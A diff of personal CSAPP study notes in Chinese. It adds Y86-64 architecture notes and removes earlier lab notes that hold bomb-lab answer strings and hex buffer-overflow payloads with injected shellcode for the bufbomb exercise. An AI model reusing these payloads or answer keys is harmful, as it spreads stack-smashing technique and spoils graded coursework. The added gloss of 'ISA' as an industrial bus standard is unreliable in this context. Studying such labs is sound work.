@@ -42,7 +42,7 @@ CPU
 	register file
 	memory
 #### 4.3 Sequential Y86-64 Implementation
-SEQ
+SEQ流程,但不是每个指令都需要走所有步骤
 	1.Fetch
 	2.Decode
 	3.Execute
@@ -56,110 +56,34 @@ SEQ
 		PC:对应一个寄存器
 	SEQ
 	SEQ+
+概念:
+    ISA: Industrial Standard Architecture，工业标准结构总线
+    Intel指令集
+    RISC:reduced instruction set computer. Embedd devices.
+    CISC:complex instruction set computer.
+    ARM: originally an acronym for "Acorn RISC machine". A British company, Acorn Computers Ltd., developed its own architecture, ARM
+
+~~~
+    为了研究处理器的架构, CSAPP设计了一套简化的计算机模型和对应的指令集叫做Y86-64. 主要特点如下:
+
+    15个寄存器, 不包括%r15. 这样内部寻址可以用0-15来选择寄存器. %rsp依然用作栈指针
+    每个寄存器都报保存64位=8字节值, 机器里操作的所有值也都是8字节长
+    三个一位的条件码: ZF SF 和 OF
+    程序计数器 PC
+    有一个状态码 Stat 用于表示程序状态
+    DMEM 内存, 这里把内存当成一个连续的虚拟内存, 内存使用基址+偏移量方式寻找, 不支持复杂的寻址运算, 其实就相当于直接用固定基础地址寻址.
+    [柚子小站](https://conyli.cc/archives/2926)
+~~~
 
 ![CPU flow](fig1.png)
 ![CPU flow](fig2.png)
 
 HCL
+Y86-64指令:
+    irmovq
+    rrmovq
+	r代表寄存器
+	i立即数
+	m内存
 
-----------------------------------------------------------
 
-#### Lab
-
-#### Lab 2
-Solutions:
-Border relations with Canada have never been better.
-1 2 4 8 16 32
-1 311或其他
-4 389
-7 0
-IONEFG (flyers)
-4 3 2 1 6 5
-
-Intel指令集
-	movslq
-	https://blog.csdn.net/qq_38712943/article/details/81358799
-info r
-p /x *0x402470 + 8
-b phase_4
-disas phase_4
-pmap
-pvector
-GDB调试技巧
-	https://blog.csdn.net/transmaple/article/details/48421891
-
-b *0x0000000000400fdf
-简书: https://www.jianshu.com/p/33eb51b2024e
-Postscript file: GDB: Quick reference
-
-打印寄存器
-    p $rax
-注意:
-	mov 0x20(%rsp),%rbx 代表赋地址
-	lea 0x20(%rsp),%rbx 代表赋值
-	
-#### lab 3
-
-不可修改的register: rip(除了ret)
-https://www.cnblogs.com/aliflycoris/p/5746143.html
-https://www.jianshu.com/p/dc41c84cef17
-https://www.cnblogs.com/yhjoker/p/7623950.html
-
-三个与栈和下一条指令有关的指令
-	call=push rip; jmp 0x____
-	leave 恢复保存的rbp,rsp,即 movl rbp, rsp; pop rbp
-	ret = pop rip
-注意事项:
-	mov 0x4, %eax #move value of memory[0x4] to eax
-	mov $0x4, %eax #move 0x4 to eax
-
-~~~
-按照userid=novik实验: 
-./bufbomb -u novik
-    0x08048c18 smoke
->>>> smoke.txt
-	00 00 00 00 00 00 00 00 00 00
-	00 00 00 00 00 00 00 00 00 00
-	00 00 00 00 00 00 00 00 00 00
-	00 00 00 00 00 00 00 00 00 00
-    00 00 00 00 18 8c 04 08
-
-0x08048c42 fizz
->>>> fizz.txt
-    -u novik
-	cookie 0x2de1951f
-	00 00 00 00 00 00 00 00 00 00
-	00 00 00 00 00 00 00 00 00 00
-	00 00 00 00 00 00 00 00 00 00
-	00 00 00 00 00 00 00 00 00 00
-    00 00 00 00 42 8c 04 08 00 00
-	00 00 1f 95 e1 2d
->>>> bang.txt
-    -u novik
-	0x55683658
->>>> bang.S
-movl $0x2de1951f, 0x804d100
-movl 0x804d100, %eax
-movl %eax, 4(%esp)
-push $0x08048c9d
-ret
-->
-c7 05 00 d1 04 08 1f 
-95 e1 2d 
-a1 00 d1 04 08       
-89 44 24 04          
-68 9d 8c 04 08       
-c3
-00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00
-58 36 68 55
->>>> dynamite.txt
-buf 0x55683658
-ret 0x08048dbe
-cookie 0x2de1951f
-movl $0x2de1951f, %eax
-movl $0x556836b0, %ebp
-push $0x08048dbe
-ret
->>>> shell
-cat dynamite.txt | ./hex2raw | ./bufbomb -u novik
